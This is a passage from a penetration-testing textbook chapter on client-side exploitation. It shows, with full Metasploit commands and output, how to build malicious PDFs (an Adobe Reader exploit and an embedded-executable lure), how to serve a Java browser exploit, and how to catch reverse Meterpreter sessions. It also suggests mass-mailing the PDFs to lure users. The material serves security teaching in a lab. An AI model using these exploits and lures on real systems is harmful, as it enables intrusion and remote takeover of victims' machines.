adobe_utilprintf.
The options for this module are a bit different than anything we’ve
seen thus far, as shown in Listing 10-10. This is a client-side attack, so there
is no RHOST option, but unlike our browser attack, there are also no SRVHOST
or SRVPORT options. This module simply creates a malicious PDF; hosting it
for delivery and setting up a payload handler is up to us. Of course, we have
all the skills necessary to perform both these tasks easily.
msf > use exploit/windows/fileformat/adobe_utilprintf
msf exploit(adobe_utilprintf) > show options
Module options (exploit/windows/fileformat/adobe_utilprintf):
Name Current Setting Required Description
---- --------------- -------- -----------
uFILENAME msf.pdf yes The file name.
Exploit target:
Id Name
-- ----
v0 Adobe Reader v8.1.2 (Windows XP SP3 English)
msf exploit(adobe_utilprintf) > exploit
[*] Creating 'msf.pdf' file...
[+] msf.pdf stored at /root/.msf4/local/msf.pdf w
Listing 10-10: A Metasploit PDF exploit
As you can see, the only option for the PDF exploit is the name of the
malicious file to be generated u. We can leave the default, msf.pdf. For this
example, we’ll have Metasploit use the default payload, windows/meterpreter/
reverse_tcp on port 4444. When we enter exploit, Metasploit generates a PDF
that will exploit this vulnerability in a vulnerable version of Adobe Reader
on Windows XP SP3 English v. The malicious PDF is stored as /root/.msf4/
local/msf.pdf w.
Now we need to serve the PDF and set up a handler for the payload, as
shown in Listing 10-11.
msf exploit(adobe_utilprintf) > cp /root/.msf4/local/msf.pdf /var/www
[*] exec: cp /root/.msf4/local/msf.pdf /var/www
msf exploit(adobe_utilprintf) > service apache2 start
[*] exec service apache2 start
226 Chapter 10
Starting web server: apache2.
msf exploit(adobe_utilprintf) > use multi/handleru
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9
lhost => 192.168.20.9
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at
2015-05-05 20:26:15 -0400 v
Listing 10-11: Serving the malicious PDF and using a handler
We copy the file to the Apache web server folder and start the server,
if it is not already running. We’ll look at ways to lure users into opening
malicious files later in this chapter, but for now we’ll just open the mali-
cious PDF in Adobe Reader 8.1.2 on our Windows XP target. First, though,
we need to set up a handler for the payload. We can use the multi/handler u
module as we learned in Chapter 4. (Be sure to kill the Aurora job if its
handler is also listening on port 4444 to free up this port for multi/handler
use). When we open the malicious PDF, we again receive a session v.
Typically with an attack like this we won’t be targeting just one user. For
best results we might use this malicious PDF as part of a social-engineering
campaign, as discussed in the next chapter, by sending out a few to even hun-
dreds of malicious PDFs in an attempt to entice users to open them. The
multi/handler listener we set up previously will close as soon as it sees the
first connection, causing us to miss any other connections that come in from
other users opening the PDF. It would be much better if we could leave our
listener open to catch additional incoming connections.
As it turns out, an advanced option for the multi/handler module solves
this problem. As shown in Listing 10-12, the advanced option ExitOnSession,
which is set to true by default, specifies whether the listener closes after it
receives a session. If we set this option to false, the listener will stay open
and allow us to catch multiple sessions with a single handler.
msf exploit(handler) > show advanced
Module advanced options:
--snip--
Name : ExitOnSession
Current Setting: true
Description : Return from the exploit after a session has been created
msf exploit(handler) > set ExitOnSession falseu
ExitOnSession => false
msf exploit(handler) > exploit -jv
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444
[*] Starting the payload handler...
Listing 10-12: Keeping the handler open for multiple sessions
Client-Side Exploitation 227
Set ExitOnSession to false in the usual way u. One side effect of this
option is that if we, say, exploit and start the listener in the foreground,
it will never close, so we will be stuck without an Msfconsole prompt
indefinitely. For this reason, Metasploit will complain and note that you
should use the -j option with exploit v to run the handler as a job, in the
background. This way you can continue to use Msfconsole while the handler
catches any incoming shells in the background. To close the handler in
the future, use jobs, followed by kill  as we did in the Aurora
example.
This exploit and the Aurora browser example discussed earlier both
rely on a missing security patch. Here we’ve exploited a security vulnerabil-
ity to hijack control of the program and execute malicious code by tricking
the user into letting us run malicious code. If the user will allow us to run
code, a vulnerability in the PDF software becomes unnecessary.
PDF Embedded Executable
Now for another PDF attack: This time we’ll embed a malicious executable
inside a PDF. The corresponding Metasploit module is exploit/windows/
fileformat/adobe_pdf_embedded_exe, as shown in Listing 10-13. Instead of
exploiting the software as soon as the PDF is opened, the generated PDF
will prompt the user for permission to run the embedded file. The success
of our attack is contingent on the user allowing our executable to run.
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf exploit(adobe_pdf_embedded_exe) > show options
Module options (exploit/windows/fileformat/adobe_pdf_embedded_exe):
Name Current Setting Required Description
---- --------------- -------- -----------
uEXENAME no The Name of payload exe.
vFILENAME evil.pdf no The output filename.
wINFILENAME yes The Input PDF filename.
xLAUNCH_MESSAGE To view the encrypted content please no The message to display in
tick the "Do not show this message the File: area
again" box and press Open.
--snip--
Listing 10-13: PDF embedded EXE module
The module lets us specify a prebuilt executable file with the EXENAME u
option. If we don’t set this option, we can embed an .exe file created from
whatever payload we select. We can again change the filename to anything
we like or leave the value as the default v. To use this module, we must
use an input PDF for the INFILENAME w option. The LAUNCH_MESSAGE x option
is the text that will be shown to the user as part of the prompt to run the
executable.
Set the relevant options, as shown in Listing 10-14.
228 Chapter 10
msf exploit(adobe_pdf_embedded_exe) > set INFILENAME /usr/share/set/readme/User_Manual.pdfu
INFILENAME => /usr/share/set/readme/User_Manual.pdf
msf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(adobe_pdf_embedded_exe) > exploit
[*] Reading in '/usr/share/set/readme/User_Manual.pdf'...
[*] Parsing '/usr/share/set/readme/User_Manual.pdf'...
[*] Using 'windows/meterpreter/reverse_tcp' as payload...
[*] Parsing Successful. Creating 'evil.pdf' file...
[+] evil.pdf stored at /root/.msf4/local/evil.pdfv
Listing 10-14: Setting module options and creating the malicious PDF
We’ll use a PDF included with Kali Linux for our example: the Metasploit
user guide at /user/share/set/readme/User_Manual.pdf u. The generated PDF is
again stored in the /root/msf4/local/ directory v. (Be sure to set up a handler
for the payload with the multi/handler module before opening the PDF on
the Windows XP target. For a refresher, see Listing 10-11.)
note The previous exploit may have left Adobe Reader in a bad state, so you may need to
restart Windows XP to get it to properly load the new PDF.
When the malicious PDF is opened, the user sees a warning like the one
shown in Figure 10-1. The user must click Open for the embedded executable
to run. This attack depends on users being willing to click through this warning.
Figure 10-1: PDF embedded executable user warning
Client-Side Exploitation 229
Once you click Open in the PDF warning, the payload will run, and you
will receive a session.
Java Exploits
Java vulnerabilities are a prevalent client-side attack vector. In fact, some
experts suggest that in light of the security issues that plague Java, users
should uninstall or disable the software in their browsers.
One thing that makes Java attacks so powerful is that one exploit can
gain access to multiple platforms. Windows, Mac, and even Linux systems
running the Java Runtime Environment (JRE) in a browser can all be
exploited by exactly the same exploit when that browser opens a malicious
page. Here are some sample exploits.
Java Vulnerability
As exhibit number one, we’ll use the Metasploit module exploit/multi/browser/
java_jre17_jmxbean, as shown in Listing 10-15. Use of this module is similar
to that of the Internet Explorer Aurora exploit shown earlier in this chap-
ter. Metasploit sets up a malicious server to exploit this cross-platform vul-
nerability on any browser that arrives at the page. Any browser running Java
version 7 before update 11 is affected.
msf > use exploit/multi/browser/java_jre17_jmxbean
msf exploit(java_jre17_jmxbean) > show options
Module options (exploit/multi/browser/java_jre17_jmxbean):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address
on the local machine or 0.0.0.0
SRVPORT 8080 yes The local port to listen on.
--snip--
URIPATH no The URI to use for this exploit (default is random)
Exploit target:
Id Name
-- ----
0 Generic (Java Payload)
msf exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9
SRVHOST => 10.0.1.9
msf exploit(java_jre17_jmxbean) > set SRVPORT 80
SRVPORT => 80
msf exploit(java_jre17_jmxbean) > set URIPATH javaexploit
URIPATH => javaexploit
msf exploit(java_jre17_jmxbean) > show payloadsu
230 Chapter 10
Compatible Payloads
===================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
--snip--
java/meterpreter/bind_tcp normal Java Meterpreter, Java Bind TCP
Stager
java/meterpreter/reverse_http normal Java Meterpreter, Java Reverse HTTP
Stager
java/meterpreter/reverse_https normal Java Meterpreter, Java Reverse
HTTPS Stager
java/meterpreter/reverse_tcp normal Java Meterpreter, Java Reverse TCP
Stager
java/shell_reverse_tcp normal Java Command Shell, Reverse TCP
Inline
--snip--
msf exploit(java_jre17_jmxbean) > set payload java/meterpreter/reverse_httpv
payload => java/meterpreter/reverse_http
Listing 10-15: Setting up a Java exploit
Set the options to match your environment. Set the SRVHOST option
to the local IP address, and change the SRVPORT, if you would like. Set the
URIPATH to something that will be easy to type in your target browser.
Notice that because this exploit is multi-platform and the code execu-
tion takes place entirely inside the JRE, our payload options are Java-based.
The usual suspects are all here, from staged payloads, inline payloads, bind
shells, reverse shells, Meterpreter, and so on, as shown in the list of payloads
at u. We’ll use the payload java/meterpreter/reverse_http, which uses legitimate
HTTP traffic v. Its options are shown in Listing 10-16.
msf exploit(java_jre17_jmxbean) > show options
Module options (exploit/multi/browser/java_jre17_jmxbean):
--snip--
Payload options (java/meterpreter/reverse_http):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST yes The local listener hostname
LPORT 8080 yes The local listener port
Exploit target:
Id Name
-- ----
0 Generic (Java Payload)
Client-Side Exploitation 231
msf exploit(java_jre17_jmxbean) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(java_jre17_jmxbean) > exploit
[*] Exploit running as background job.
[*] Started HTTP reverse handler on http://192.168.20.9:8080/
[*] Using URL: http://192.168.20.9:80/javaexploit
[*] Server started.
msf exploit(java_jre17_jmxbean) > [*] 192.168.20.12 java_jre17_jmxbean - handling
request for /javaexploit
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar
[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar
[*] 192.168.20.12:49188 Request received for /INITJM...
[*] Meterpreter session 1 opened (192.168.20.9:8080 -> 192.168.20.12:49188) at 2015-05-05
19:15:19 -0400
Listing 10-16: Exploiting a Java vulnerability with an HTTP payload
These options should look familiar. The default LPORT option is now
8080 instead of 4444. Notice that both SRVPORT and LPORT default to 8080,
so we’ll need to change at least one of them.
After you’ve finished setting options, start the exploit server and browse
to the malicious page from your Windows 7 target. Either Internet Explorer
or Mozilla Firefox will fall victim to this attack as long as you have enabled
the vulnerable Java browser plugin.
One of the great features of the HTTP and HTTPS Meterpreter pay-
loads, aside from being legitimate HTTP and HTTPS traffic and thus
by passing even some traffic-inspecting filters, is their ability to reattach to
a dropped session. (Network problems can cause sessions to spontaneously
die—a big annoyance for pentesters.) We’ll examine other ways to gain
persistent access in Chapter 13, but for now let’s detach our Meterpreter
session, as shown in Listing 10-17.
msf exploit(java_jre17_jmxbean) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > detach
[*] 10.0.1.16 - Meterpreter session 1 closed. Reason: User exit
msf exploit(java_jre17_jmxbean) >
[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/...
[*] Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching...
[*] Meterpreter session 2 opened (192.168.20.9:8080 -> 192.168.20.12:49204) at
2015-05-05 19:15:45 -0400 u
Listing 10-17: Detaching the HTTP Meterpreter session
As you can see, the handler for the HTTP Meterpreter payload is still
running in the background. Wait a few seconds, and you should see a new
session open without the user needing to revisit the attack page as shown
at u. Unless the session has been formally exited, the payload will continue
232 Chapter 10
to try to connect back to Metasploit. (You can specify how long the ses-
sion tries to reconnect with the SessionCommunicationTimeOut parameter, an
advanced option for the payload.)
But what if your pentest target is diligent in updating Java, and there
are currently no zero-days for the software floating around the Internet?
Signed Java applet
Much like the attack against PDF users discussed in “PDF Embedded
Executable” on page 228, we can bypass the need for an unpatched Java